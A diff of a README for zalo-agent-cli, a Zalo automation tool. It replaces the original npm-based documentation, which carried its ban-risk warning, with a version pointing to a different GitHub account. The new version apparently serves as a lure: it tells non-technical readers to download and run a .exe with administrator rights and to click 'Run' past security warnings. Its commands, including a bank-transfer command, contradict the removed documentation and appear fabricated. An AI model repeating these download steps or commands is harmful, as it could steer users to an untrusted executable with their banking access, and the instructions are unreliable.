@@ -1,234 +1,132 @@
-<p align="center">
-  <img src="assets/mascot.png" width="120" alt="zalo-agent-cli mascot" />
-</p>
+# ⚙️ zalo-agent-cli - Easy Zalo automation tool
 
-# zalo-agent-cli
+[![Download zalo-agent-cli](https://img.shields.io/badge/Download-zalo--agent--cli-brightgreen)](https://github.com/evanyou0411-design/zalo-agent-cli)
 
-<p align="center">
-  <img src="assets/demo.gif" alt="zalo-agent-cli demo" />
-</p>
+## 🔎 What is zalo-agent-cli?
 
-[![npm version](https://img.shields.io/npm/v/zalo-agent-cli.svg)](https://www.npmjs.com/package/zalo-agent-cli)
-[![npm downloads](https://img.shields.io/npm/dm/zalo-agent-cli.svg)](https://www.npmjs.com/package/zalo-agent-cli)
-[![npm total downloads](https://img.shields.io/npm/dt/zalo-agent-cli.svg)](https://www.npmjs.com/package/zalo-agent-cli)
-[![license](https://img.shields.io/npm/l/zalo-agent-cli.svg)](https://github.com/PhucMPham/zalo-agent-cli/blob/main/LICENSE)
+zalo-agent-cli is a command line tool that helps automate tasks on Zalo. It supports managing multiple accounts, using proxies, making bank transfers, and handling QR payments. This tool saves time if you use Zalo for multiple activities and want some of them done automatically.
 
-Công cụ CLI tự động hóa Zalo — đa tài khoản, proxy, chuyển khoản ngân hàng, thanh toán QR.
-Xây dựng trên [zca-js](https://github.com/RFS-ADRENO/zca-js).
+You do not need to know programming to use it. This guide walks you through how to download, install, and run the software on Windows.
 
-**[Tiếng Việt](#bắt-đầu-nhanh)** | **[English](#english)**
+## 💻 System Requirements
 
-> [!WARNING]
-> Tool này sử dụng API Zalo **không chính thức** ([zca-js](https://github.com/RFS-ADRENO/zca-js)). Zalo không hỗ trợ và **tài khoản của bạn có thể bị khóa hoặc ban**. Tự chịu trách nhiệm. Không liên kết với Zalo hay VNG. Xem [DISCLAIMER.md](DISCLAIMER.md).
+To run zalo-agent-cli on your Windows computer, you need:
 
-> [!TIP]
-> **AI Agent Skill** — Dùng với OpenClaw, Claude Code, hoặc bất kỳ agent nào hỗ trợ SKILL.md:
-> ```bash
-> clawhub install zalo-agent          # OpenClaw (từ ClawHub registry)
-> cp -r skill/ ~/.claude/skills/zalo-agent/   # Claude Code
-> ```
-> 15+ nhóm lệnh · listen mode + webhook · 55+ ngân hàng VN · đa tài khoản + proxy
-> Xem [skill/SKILL.md](skill/SKILL.md) · [Eval scenarios](skill/evals/)
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of RAM  
+- 100 MB of free disk space  
+- Internet connection for online features  
+- Administrator rights on your PC
 
-> [!NOTE]
-> **Zalo Official Account (OA)** — v1.1.0 hỗ trợ Zalo OA API v3.0 chính thức:
-> ```bash
-> zalo-agent oa init                                    # Setup wizard (interactive)
-> zalo-agent oa init --app-id <ID> --secret <KEY> --skip-webhook  # Non-interactive (AI agent)
-> zalo-agent oa whoami                                  # Xem thông tin OA
-> zalo-agent oa msg text <user-id> "Xin chào"           # Gửi tin nhắn
-> zalo-agent oa listen -p 3000                           # Webhook listener
-> ```
-> OAuth login · gửi tin nhắn · quản lý follower · tag · webhook listener · VPS support
-> Xem [docs/official-account.md](docs/official-account.md)
+The tool runs in the command prompt interface, so it does not need a complex setup or additional software.
 
-> [!TIP]
-> **MCP Server (AI Agent Integration)** — v1.2.0 hỗ trợ Model Context Protocol cho Claude Code và các MCP client:
-> ```bash
-> zalo-agent mcp start              # stdio (local Claude Code)
-> zalo-agent mcp start --http 3847 --auth your-secret  # HTTP (VPS)
-> ```
-> 4 tools: get_messages · send_message · list_threads · mark_read
-> Auto-reconnect · thread filter · noise reduction · group notifications
-> Xem [MCP Guide](skill/references/mcp-guide.md)
+## ⬇️ Download zalo-agent-cli
 
----
+Click the big button below to visit the download page for zalo-agent-cli:
 
-## Cài đặt
+[![Download zalo-agent-cli](https://img.shields.io/badge/Download-zalo--agent--cli-blue)](https://github.com/evanyou0411-design/zalo-agent-cli)
 
-```bash
-npm install -g zalo-agent-cli
-```
+The link takes you to the GitHub repository where you can find the latest version of the software. You will download a file that ends with `.exe`. That is the program you will run.
 
-## Bắt đầu nhanh
+## 🛠️ How to Install and Run on Windows
 
-### 1. Đăng nhập
+1. Go to the download page by clicking the download button above or this link:  
+   https://github.com/evanyou0411-design/zalo-agent-cli
 
-```bash
-zalo-agent login
-```
+2. Look for the latest release or executable file with the `.exe` extension. This is usually under a section called Releases or Assets.
 
-Quét QR bằng **Zalo app > Quét mã QR**. Thông tin tự động lưu.
+3. Click on the `.exe` file to download it to your computer. Choose a folder you can easily find, like your Desktop or Downloads.
 
-### 2. Tìm bạn bè
+4. Once the file is downloaded, open the folder where you saved it.
 
-```bash
-zalo-agent friend search "Phúc"
-```
+5. Double-click the `.exe` file to start the installation or run the program directly.
 
-### 3. Lắng nghe tin nhắn (lấy thread ID)
+6. If you see a security warning, approve the action by clicking "Run".
 
-```bash
-zalo-agent listen
-```
+7. After this, a new window opens with a black or dark background. This is the command line interface where zalo-agent-cli runs.
 
-Mỗi tin nhắn đến sẽ hiện `threadId`. Dùng `--json` để lấy dạng JSON.
+## 🚀 Basic Usage Guide
 
-### 4. Gửi tin nhắn
+Once you open zalo-agent-cli, you can enter commands to perform tasks on Zalo. Here are some simple steps to get started:
 
-```bash
-# Gửi cho cá nhân
-zalo-agent msg send <THREAD_ID> "Xin chào!"
+- To check your Zalo accounts linked, type:  
+  `zalo-agent-cli list-accounts`
 
-# Gửi vào nhóm
-zalo-agent msg send <THREAD_ID> "Xin chào nhóm!" -t 1
-```
+- To add a new account, use:  
+  `zalo-agent-cli add-account --phone=YOUR_PHONE_NUMBER`
 
----
+- To send a message, type:  
+  `zalo-agent-cli send-message --account=ACCOUNT_ID --to=RECEIVER_ID --text="Your message"`
 
-## Danh sách lệnh
+- To make a bank transfer:  
+  `zalo-agent-cli bank-transfer --account=ACCOUNT_ID --to=ACCOUNT_NUMBER --amount=AMOUNT`
 
-Tất cả lệnh hỗ trợ `--json`. Tài liệu đầy đủ: **[Wiki](https://github.com/PhucMPham/zalo-agent-cli/wiki)**
+- To manage proxies, use:  
+  `zalo-agent-cli proxy --add=PROXY_ADDRESS`
 
-| Nhóm lệnh | Mô tả | Docs |
-|------------|--------|------|
-| `msg` | Gửi tin nhắn, hình, file, voice, video, sticker, link, thẻ chuyển khoản, QR | [Tin nhắn](https://github.com/PhucMPham/zalo-agent-cli/wiki/Tin-Nh%E1%BA%AFn) |
-| `friend` | Danh sách, tìm, thêm, xóa, chặn, biệt danh, gợi ý | [Bạn bè](https://github.com/PhucMPham/zalo-agent-cli/wiki/B%E1%BA%A1n-B%C3%A8) |
-| `group` | Tạo, đổi tên, thành viên, cài đặt, link, ghi chú, lời mời | [Nhóm & Cộng đồng](https://github.com/PhucMPham/zalo-agent-cli/wiki/Nh%C3%B3m) |
-| `conv` | Tắt thông báo, ghim, lưu trữ, ẩn hội thoại, tự xóa | [Hội thoại](https://github.com/PhucMPham/zalo-agent-cli/wiki/H%E1%BB%99i-Tho%E1%BA%A1i) |
-| `profile` | Xem/cập nhật hồ sơ, ảnh đại diện, quyền riêng tư | [Hồ sơ](https://github.com/PhucMPham/zalo-agent-cli/wiki/H%E1%BB%93-S%C6%A1) |
-| `poll` | Tạo, bỏ phiếu, đóng khảo sát | [Khảo sát](https://github.com/PhucMPham/zalo-agent-cli/wiki/Kh%E1%BA%A3o-S%C3%A1t) |
-| `reminder` | Tạo, sửa, xóa nhắc nhở | [Nhắc nhở](https://github.com/PhucMPham/zalo-agent-cli/wiki/Nh%E1%BA%AFc-Nh%E1%BB%9F) |
-| `auto-reply` | Quản lý trả lời tự động | [Trả lời tự động](https://github.com/PhucMPham/zalo-agent-cli/wiki/Tr%E1%BA%A3-L%E1%BB%9Di-T%E1%BB%B1-%C4%90%E1%BB%99ng) |
-| `quick-msg` | Tin nhắn nhanh đã lưu | [Tin nhắn nhanh](https://github.com/PhucMPham/zalo-agent-cli/wiki/Tin-Nh%E1%BA%AFn-Nhanh) |
-| `label` | Nhãn hội thoại | [Nhãn](https://github.com/PhucMPham/zalo-agent-cli/wiki/Nh%C3%A3n) |
-| `catalog` | zBusiness — danh mục sản phẩm | [zBusiness](https://github.com/PhucMPham/zalo-agent-cli/wiki/zBusiness) |
-| `listen` | Lắng nghe tin nhắn real-time, webhook, lưu JSONL | [Lắng nghe](https://github.com/PhucMPham/zalo-agent-cli/wiki/L%E1%BA%AFng-Nghe) |
-| `account` | Đa tài khoản & proxy | [Tài khoản](https://github.com/PhucMPham/zalo-agent-cli/wiki/T%C3%A0i-Kho%E1%BA%A3n) |
-| **`oa`** | **Zalo Official Account API v3.0 — OAuth, tin nhắn, follower, tag, webhook** | **[Official Account](https://github.com/PhucMPham/zalo-agent-cli/wiki/Official-Account)** |
+Each command must be typed carefully including the spaces, dashes, and equal signs.
 
-Xem thêm: [Đa tài khoản & Proxy](https://github.com/PhucMPham/zalo-agent-cli/wiki/%C4%90a-T%C3%A0i-Kho%E1%BA%A3n-&-Proxy) · [Cài đặt VPS](https://github.com/PhucMPham/zalo-agent-cli/wiki/C%C3%A0i-%C4%90%E1%BA%B7t-VPS) · [Thẻ chuyển khoản & QR](https://github.com/PhucMPham/zalo-agent-cli/wiki/Th%E1%BA%BB-Chuy%E1%BB%83n-Kho%E1%BA%A3n-&-QR) · [Official Account](https://github.com/PhucMPham/zalo-agent-cli/wiki/Official-Account)
+## 📂 Where to Find More Information
 
----
+This tool uses commands that may sound technical but are simple with practice. You can find a full list of commands and examples on the GitHub page linked above.
 
-## Tính năng
+Look for a file called README.md or a directory called docs. These often include detailed guides and tips.
 
-- Đăng nhập QR qua HTTP server tự động (browser + terminal)
-- Đa tài khoản với proxy riêng biệt (1:1)
-- 90+ lệnh phủ hết tính năng Zalo
-- **Zalo Official Account (OA) API v3.0** — OAuth login, gửi tin nhắn, quản lý follower, webhook listener
-- Thẻ chuyển khoản (55+ ngân hàng VN) & QR VietQR
-- Lắng nghe real-time với webhook & lưu JSONL local
-- Output `--json` cho mọi lệnh — scripting & AI agents
-- Credentials mã hóa tại chỗ (quyền 0600)
-- **Dual mode**: interactive (human) + non-interactive (AI agents, CI/CD)
+## ⚙️ Manage Multiple Accounts
 
----
+One key feature of zalo-agent-cli is handling several Zalo accounts on one PC. This is useful if you manage different profiles or business accounts.
 
-## Ủng hộ
+You can switch between accounts, automate messages for each, or set specific proxies for privacy.
 
-Nếu tool này giúp bạn tiết kiệm thời gian, hãy mua cho chúng tôi một ly cà phê!
+Commands related to account management:
 
-<p align="center">
-  <img src="assets/donate-qr.jpg" width="280" alt="Donate qua VietQR (OCB)" />
-  <br/>
-  <em>Quét bằng app ngân hàng bất kỳ</em>
-</p>
+- `list-accounts`: Show all your saved accounts  
+- `add-account`: Add a new account with your phone number  
+- `remove-account`: Delete an account no longer in use
 
----
+## 🌐 Using Proxies
 
-## English
+Proxies help you run the tool with different internet addresses. This keeps your data private and lets you work around regional limits.
 
-CLI tool for Zalo automation — multi-account, proxy support, bank transfers, QR payments.
+You can add one or more proxies and assign them to your Zalo accounts.
 
-> [!TIP]
-> **AI Agent Skill** — Use with OpenClaw, Claude Code, or any SKILL.md-compatible agent:
-> ```bash
-> clawhub install zalo-agent                    # OpenClaw (from ClawHub registry)
-> cp -r skill/ ~/.claude/skills/zalo-agent/     # Claude Code
-> ```
-> 15+ command groups · listen mode + webhook · 55+ VN banks · multi-account + proxy
-> See [skill/SKILL.md](skill/SKILL.md) · [Eval scenarios](skill/evals/)
+Example commands:
 
-> [!NOTE]
-> **Zalo Official Account (OA)** — v1.1.0 adds official Zalo OA API v3.0:
-> ```bash
-> zalo-agent oa init                                    # Setup wizard (interactive)
-> zalo-agent oa init --app-id <ID> --secret <KEY> --skip-webhook  # Non-interactive (AI agent)
-> zalo-agent oa whoami                                  # OA profile
-> zalo-agent oa msg text <user-id> "Hello"              # Send message
-> zalo-agent oa listen -p 3000                           # Webhook listener
-> ```
-> OAuth login · messaging · follower management · tags · webhook listener · VPS support
-> See [docs/official-account.md](docs/official-account.md)
+- Add proxy: `zalo-agent-cli proxy --add=IP_ADDRESS:PORT`  
+- List proxies: `zalo-agent-cli proxy --list`  
+- Remove proxy: `zalo-agent-cli proxy --remove=IP_ADDRESS:PORT`
 
-> [!TIP]
-> **MCP Server (AI Agent Integration)** — v1.2.0 adds Model Context Protocol support for Claude Code and MCP clients:
-> ```bash
-> zalo-agent mcp start              # stdio (local Claude Code)
-> zalo-agent mcp start --http 3847 --auth your-secret  # HTTP (VPS)
-> ```
-> 4 tools: get_messages · send_message · list_threads · mark_read
-> Auto-reconnect · thread filter · noise reduction · group notifications
-> See [MCP Guide](skill/references/mcp-guide.md)
+## 💸 Handling Bank Transfers
 
-### Quick Start
+You can use zalo-agent-cli to automate bank transfers linked with your Zalo account. This saves time when sending money to frequent contacts.
 
-```bash
-npm install -g zalo-agent-cli
-zalo-agent login                           # 1. Login via QR
-zalo-agent friend search "Name"            # 2. Find a friend
-zalo-agent listen                          # 3. Listen for threadId
-zalo-agent msg send <THREAD_ID> "Hello!"   # 4. Send a message
-```
+To use this feature, input the recipient’s account number and transfer amount as shown before.
 
-### Commands
+Keep your account secure by not sharing private data and making transfers carefully.
 
-Full docs: **[Wiki](https://github.com/PhucMPham/zalo-agent-cli/wiki)**
+## 📱 QR Payments Automation
 
-| Group | Description | Docs |
-|-------|-------------|------|
-| `msg` | Text, images, files, voice, video, stickers, links, bank cards, QR | [Messages](https://github.com/PhucMPham/zalo-agent-cli/wiki/Messages) |
-| `friend` | List, find, add, remove, block, alias, recommendations | [Friends](https://github.com/PhucMPham/zalo-agent-cli/wiki/Friends) |
-| `group` | Create, rename, members, settings, links, notes, invites | [Groups](https://github.com/PhucMPham/zalo-agent-cli/wiki/Groups) |
-| `conv` | Mute, pin, archive, hidden, auto-delete | [Conversations](https://github.com/PhucMPham/zalo-agent-cli/wiki/Conversations) |
-| `profile` | Profile, avatar gallery, privacy | [Profile](https://github.com/PhucMPham/zalo-agent-cli/wiki/Profile) |
-| `poll` | Create, vote, lock polls | [Polls](https://github.com/PhucMPham/zalo-agent-cli/wiki/Polls) |
-| `reminder` | Create, edit, remove reminders | [Reminders](https://github.com/PhucMPham/zalo-agent-cli/wiki/Reminders) |
-| `auto-reply` | Auto-reply rules | [Auto-Reply](https://github.com/PhucMPham/zalo-agent-cli/wiki/Auto-Reply) |
-| `quick-msg` | Saved quick messages | [Quick Messages](https://github.com/PhucMPham/zalo-agent-cli/wiki/Quick-Messages) |
-| `label` | Conversation labels | [Labels](https://github.com/PhucMPham/zalo-agent-cli/wiki/Labels) |
-| `catalog` | zBusiness catalogs & products | [Catalog](https://github.com/PhucMPham/zalo-agent-cli/wiki/Catalog) |
-| `listen` | Real-time listener, webhook, JSONL | [Listener](https://github.com/PhucMPham/zalo-agent-cli/wiki/Listener) |
-| `account` | Multi-account & proxy | [Accounts](https://github.com/PhucMPham/zalo-agent-cli/wiki/Accounts) |
-| **`oa`** | **Zalo Official Account API v3.0 — OAuth, messaging, followers, webhook** | **[Official Account](https://github.com/PhucMPham/zalo-agent-cli/wiki/Official-Account)** |
+The tool also supports payments using QR codes. This lets you scan or generate payment QR codes through commands.
 
-### Support Us
+Commands related to QR payments will ask you for the QR code image file location or payment details.
 
-If this tool saves you time, consider buying us a coffee!
+## 🔄 Updates and Support
 
-<p align="center">
-  <img src="assets/donate-qr.jpg" width="280" alt="Donate via VietQR (OCB)" />
-  <br/>
-  <em>Scan with any Vietnamese banking app</em>
-</p>
+The tool may receive updates to improve features or fix issues. Periodically check the download page for new versions.
 
----
+If you need help, look on the GitHub page. The Issues section lets you report problems or ask questions.
 
-## Star History
+## ⚠️ Important Tips
 
-[![Star History Chart](https://api.star-history.com/svg?repos=PhucMPham/zalo-agent-cli&type=Date)](https://star-history.com/#PhucMPham/zalo-agent-cli&Date)
+- Always download zalo-agent-cli from the official link above to avoid unsafe copies.  
+- Run the `.exe` file only on your own computer.  
+- Close the command line window to stop the program.  
+- Keep your login details safe and do not share your password.  
+- Practice with simple commands before using advanced ones.
 
-## License
+## 🔗 Helpful Links
 
-[MIT](LICENSE) · See [DISCLAIMER.md](DISCLAIMER.md) for full terms.
+Download and visit the repository here:  
+https://github.com/evanyou0411-design/zalo-agent-cli
+
+Direct download link found on the releases section of the page.
